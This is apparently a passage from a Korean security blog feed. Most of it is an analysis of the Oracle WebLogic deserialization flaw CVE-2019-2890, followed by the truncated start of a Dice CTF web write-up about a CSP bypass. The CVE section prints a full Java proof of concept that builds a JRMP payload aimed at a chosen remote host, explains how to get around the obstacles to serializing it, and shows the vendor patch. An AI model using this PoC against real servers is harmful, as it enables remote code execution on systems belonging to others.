하고, 암호화하는 메서드입니다. <code>Line 5 ~ 11</code>에서 데이터를 직렬화하고, <code>Line 16 ~ 20</code>까지가 암호화하는 부분입니다. 여기서 직렬화할 때 데이터의 대한 검증 로직만 있었으면 해당 취약점은 터지지 않았을 건데, 검증 로직이 없어 취약점까지 연계가 되었습니다. 이렇게 writeSubject 메소드에서 만들어진 직렬화 데이터는 아까 말한 T3 프로토콜을 이용해서 웹 로직 서버로 전송을 하게 됩니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundExeception </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().lock();</span><br><span class="line">        <span class="keyword">this</span>._propertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._propBagClassNames = (Set)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._contextPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._invocationPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._state = (PersistentContext.State)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>.readsubject(var1);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>직렬화 데이터를 T3 프로토콜로 전송하면 <code>readObject</code> 메서드를 이용해서 받아 <code>readSubject</code> 메서드로 넘겨주는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var2 = var1.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[var2];</span><br><span class="line">        var1.readFully(var3);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            var3 = EncryptionUtil.decrypt(var3);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream var4 = <span class="keyword">new</span> ByteArrayInputStream(var3);</span><br><span class="line">        ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)var5.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>직렬화 데이터는 <code>readObject</code> 메서드에서 <code>readSubject</code> 메서드로 전달해 줘 받게 됩니다. <code>Line 3 ~ 8</code>에서 데이터를 읽고, 복호화를 하고, <code>Line 10 ~ 12</code>에서 역직렬화를 하는데 바로 이때 RCE가 터집니다.<br></p><p>이로서 우리는 <code>PersistentContext</code> 클래스에서는 직렬화한 데이터를 암호화하고, 전송한다는 것을 알고 있습니다. 그렇기 때문 익스플로잇을 하려면 이를 기반으로 POC를 작성해서 직렬화 데이터를 만들어주어야 합니다. </p><hr><h2 id="CVE-2019-2890-POC"><a href="#CVE-2019-2890-POC" class="headerlink" title=" CVE-2019-2890 POC"></a><span style="color:#21C587"></span> CVE-2019-2890 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.wsee.jaxws.persistence;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.kernel.KernelStatus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span>  </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sep = command.indexOf(<span class="number">58</span>);</span><br><span class="line">            String host;</span><br><span class="line">            <span class="keyword">int</span> port;</span><br><span class="line">            <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                port = (<span class="keyword">new</span> Random()).nextInt(<span class="number">65535</span>);</span><br><span class="line">                host = command;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">                port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ObjID id = <span class="keyword">new</span> ObjID((<span class="keyword">new</span> Random()).nextInt());</span><br><span class="line">            TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">            UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">            RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">            Registry proxy = (Registry)Proxy.newProxyInstance(ysoserial.payloads.JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">            <span class="keyword">return</span> proxy;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">            PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            objectOutputStream.writeObject(pc);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>위 java code가 main poc 코드입니다. 위 poc 클래스를 이용해 직렬화 데이터를 만들어야 합니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (SubjectManager.getSubjectManager().isKernelIdentity(this._subject)) &#123;</span></span><br><span class="line"><span class="comment">//        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span></span><br><span class="line"><span class="comment">//        getSubjectManager().getAnonymousSubject();</span></span><br><span class="line"><span class="comment">//        var3.writeObject(var4);</span></span><br><span class="line"><span class="comment">//    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//        var3.writeObject(this._subject);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">[+] var3.writeObject(Poc.getObject());</span><br><span class="line"></span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (KernelStatus.isServer()) &#123;</span></span><br><span class="line"><span class="comment">//        var5 = EncryptionUtil.encrypt(var5);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위와 같이 writeSubject 메서드에서 <code>Poc.getObject</code>를 추가하면 됩니다. 하지만 일단 직렬화 데이터를 만들기 전에는 4가지 문제점이 생기는데 이를 모두 해결해줘야 합니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.bea.core.security.managers.NotSupportedException</span><br><span class="line">    at weblogic.security.service.SecurityServiceManager.isKernelIdentity(SecurityServiceManager.java:546)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.PersistenContext.&lt;init&gt;(PersistentContext.java:168)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.Poc2.main(Poc2.java:27)</span><br></pre></td></tr></table></figure><ol><li>첫 번째 오류는 PersistenContext 객체를 만들 때 발생합니다. 이 에러는 PersistenContext를 초기화 중에 호출 하는데 <code>SecurityServiceManager.isKernelIdentity</code> 메서드를 이용해서 커널 ID를 체크하는데 이때 에러를 내뱉고 직렬화를 종료하게 됩니다.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> bollean <span class="title">isKernelIdentity</span><span class="params">(AuthenticatedSubject var0)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> NotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isKernelIdentity</code> 메서드에서 <code>NotSupportedException</code> 메서드를 호출하는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PersistenContext(<span class="meta">@NotNull</span> String var1, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var2, <span class="meta">@NotNull</span> Set&lt;String&gt; var3, <span class="meta">@Nullable</span> Map&lt;String, Serializable&gt; var4, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var5) &#123;</span><br><span class="line">    <span class="keyword">super</span>(var1);</span><br><span class="line">    <span class="keyword">this</span>._propertyMap = var2;</span><br><span class="line">    <span class="keyword">this</span>._proBagClassNames = var3;</span><br><span class="line">    <span class="keyword">this</span>._contextPropertyMap = var4;</span><br><span class="line">    <span class="keyword">this</span>._invocationPropertyMap = var5;</span><br><span class="line">    <span class="keyword">this</span>._state = PersistentContext.State.UNUSED;</span><br><span class="line">   AuthenticatedSubject var6 = getCurrentSubject();</span><br><span class="line"><span class="comment">//      if (SecurityServiceManager.isKernelIdentity(var(6)) &#123;</span></span><br><span class="line"><span class="comment">//          throw new IllegalStateException(&quot;Attempt to create PersistentContext using kernel identity. All actions that can create PersistentContext must run as a user principal&quot;);</span></span><br><span class="line"><span class="comment">//      &#125; else &#123;</span></span><br><span class="line"><span class="comment">//          this._subject = var6;</span></span><br><span class="line"><span class="comment">//          this._initTransients();</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">    <span class="keyword">this</span>._subject = var6;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>첫 번재 문제는 위와 같이 <code>PersistenContext</code>에서 <code>isKernelIdentity</code> 메서드를 이용한 조건문을 모두 주석 처리함으로 해결할 수 있습니다.<br></p><ol start="2"><li>두 번째 문제는 <code>deserialization PersistenContext</code> 클래스가 중단되는 것 입니다. </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersistentContext</span> <span class="keyword">extends</span> <span class="title">AbstractStorable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AuthenticatedSubject KERNEL_ID = (AuthenticatedSubject)AccessController.doPrivileged(PrivilgedActions.getKernelIdentityAction());</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ReentranReadWriteLock _lock;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Serializable&gt; _propertyMap;</span><br><span class="line">    </span><br><span class="line">    (생략)</span><br></pre></td></tr></table></figure><p><code>PersistentContext</code> 클래스를 보면 <code>AuthenticatedSubject</code>를 초기화하는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SubjectManager <span class="title">getSubjectManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object var0 = ceSubjectManagerLock; var0 (slot_0): Object@<span class="number">661</span></span><br><span class="line">    <span class="keyword">synchronized</span>(ceSubjectManagerLock) &#123;</span><br><span class="line">        <span class="keyword">while</span>(ceSubjectManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ceClient) &#123;</span><br><span class="line">                ceSubjectManager = SubjectManagerFactory.getInstance().getSubjectManager();</span><br><span class="line">                <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">             &#125;</span><br><span class="line">             </span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 ceSubjectManagerLock.wait();</span><br><span class="line">             &#125; <span class="keyword">catch</span> (InterruptedException var3) &#123;</span><br><span class="line">                 <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var3);</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AuthenticatedSubject</code>를 초기화 할 때는 위 코드가 실행되는데 <code>ceClient</code>의 값이 <code>True</code>가 아니라면 무한 루프에 빠지는 것을 볼 수 있습니다. <code>ceSubjectManagerLock.wait</code> 메서드에서는 직렬화가 실행되지 않습니다. 그리고 <code>ceClient</code>는 시스템 속성이기 때문에 <code>com.bea.core.internal.client</code>을 이용해서 <code>True</code>를 설정할 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final bollean ceClient &#x3D; &quot;true&quot;.equalsIgnoreCase(System.getProperty( key:&quot;com.bea.core.internal.client&quot;, def:&quot;false&quot;));</span><br></pre></td></tr></table></figure><p>그래서 위와 같이 <code>ceClient</code> 변수를 설정해주면 무한루프에 빠지지 않아 두 번째 문제도 해결할 수 있습니다.<br></p><ol start="3"><li>세 번째 문제는 직렬화 데이터가 암호화되지 않는다는 것 입니다.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] var0) &#123;</span><br><span class="line">    <span class="keyword">return</span> Kernel.isServer() ? getEncryptionService().encryptBytes(var0) : var0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EncryptionUtilencrypt</code>를 확인해보면 <code>isServer</code> 메서드 값이 참이면 암호화한 값을 넣어주고, 참이 아니면 암호화하지 않고 원본을 반환하는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KernelStatus.setIsServer(true)</span><br></pre></td></tr></table></figure><p>그래서 직렬화 데이터를 암호화하기 전에 위 구문을 정의해줌으로서 <code>isServer</code> 값이 참이 되게 만들면 직렬화 데이터가 잘 암호회되어 세 번째 문제도 해결할 수 있습니다.<br></p><ol start="4"><li>네 번째 문제는 암호화에 사용되는 <code>SerializedSystemIni.dat</code> 파일이 없다는 겁니다. 해당 문제를 해결하기 위해서는 현재 웹 로직에서 사용되고 있는 <code>SerializedSystemIni.dat</code> 파일을 poc 디렉터리에 넣어주면 됩니다.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">    PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">    ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">    objectOutputStream.writeObject(pc);</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4가지의 문제를 모두 해결하였으면 <code>poc.ser</code> 파일을 생성하고, 해당 파일로 익스를 진행하면 RCE를 트리거 할 수 있습니다.</p><hr><h2 id="CVE-2019-2890-Patch"><a href="#CVE-2019-2890-Patch" class="headerlink" title=" CVE-2019-2890 Patch"></a><span style="color:#21C587"></span> CVE-2019-2890 Patch</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream in)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = in.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">        in.readFully(bytes);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            bytes = EncryptionUtil.decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in2 = <span class="keyword">new</span> PersistentContext.WSFilteringObjectInputStream(bais);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)in2.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>패치 코드를 확인해보면 <code>readSubject</code> 메서드에서 데이터를 검증하는 <code>WSFilteringObjectInputStream</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> tatic <span class="class"><span class="keyword">class</span> <span class="title">WSFilteringObjectInputStream</span> <span class="keyword">extends</span> <span class="title">FilteringObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String firstClassName;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WSFilteringObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        Class clazz = <span class="keyword">super</span>.resloveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.firstClassName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            String className = descriptor.getName();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz.asSubclass(Subject.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassExecption(<span class="string">&quot;Internal System Error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">this</span>.firstClassName = className;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WSFilteringObjectInputStream</code> 메서드는 위와 같습니다.</p><hr><h2 id="CVE-2019-2890-Point"><a href="#CVE-2019-2890-Point" class="headerlink" title=" CVE-2019-2890 Point"></a><span style="color:#21C587"></span> CVE-2019-2890 Point</h2><ul><li>조건<br></li></ul><ol><li>웹 로직에서 T3 프로토콜이 열려있어야한다.</li><li>웹 로직에서 사용하고 있는 SerializedSystemIni.dat 파일을 릭할 수 있어야 한다.</li></ol><p>분석을 해본 결과 해당 취약점을 이용해서 익스를 하기 위해서는 위 2가지 조건을 충족해야 하는 거 같습니다. 긴 글 읽어주셔서 감사합니다.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF Write Up</title>
      <link href="2021/02/08/2021-02-08-Dice-CTF/"/>
      <url>2021/02/08/2021-02-08-Dice-CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image2/blob/main/Dice%20CTF/dice%20main.png?raw=true"></p><p>2021년 2월 6일부터 8일 새벽까지는 Dice CTF의 모든 시간을 쏟아 웹 문제를 풀어보았습니다. 한 문제의 12 시간을 연달아 풀어본 적은 없었는 데 이번 대회에선 이렇게 열심히 풀었던 이유는 미국의 RGB 팀에 들어가기 위해서였습니다. RGB 팀의 미국 형님(팀장)은 날 원하는데 팀원들도 있기 때문에 Dice CTF에서 좋은 성과를 내서 팀원들한테도 인정을 받으라는 뉘앙스로 말씀을 하셔서였다. 여튼 이번 대회에서 해결 한 웹 5 문제 Write Up을 작성해보겠습니다.<br></p><hr><h2 id="Web-Babier-CSP-107-pts"><a href="#Web-Babier-CSP-107-pts" class="headerlink" title=" (Web) Babier CSP [107 pts]"></a><span style="color:#21C587"></span> (Web) Babier CSP [107 pts]</h2><blockquote><p>The Babier CSP challenge is a simple CSP Bypass challenge.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">LRGWAXOY98Es0zz0QOVmag</span>==&gt;</span></span><br><span class="line"><span class="javascript">elem.onclick = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">  location = <span class="string">&quot;/?name=&quot;</span> + <span class="built_in">encodeURIComponent</span>([<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;pineapple&quot;</span>, <span class="string">&quot;pear&quot;</span>][<span class="built_in">Math</span>.floor(<span class="number">4</span> * <span class="built_in">Math</span>.random())]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script 